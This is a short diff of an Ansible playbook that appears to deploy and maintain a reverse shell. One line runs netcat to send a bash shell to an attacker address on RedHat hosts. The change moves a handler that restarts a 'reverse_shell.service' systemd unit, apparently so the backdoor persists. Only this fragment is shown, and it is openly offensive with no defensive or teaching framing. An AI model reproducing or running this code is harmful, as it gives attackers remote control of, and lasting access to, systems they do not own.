@@ -92,9 +92,8 @@
         nc $attacker_ip $port -e /bin/bash
     when: ansible_facts['os_family'] == "RedHat"
 
-  handlers:
-    - name: restart reverse shell service
-      systemd:
-        name: reverse_shell.service
-        state: restarted
+  - name: restart reverse shell service
+    systemd:
+      name: reverse_shell.service
+      state: restarted
   ignore_errors: yes
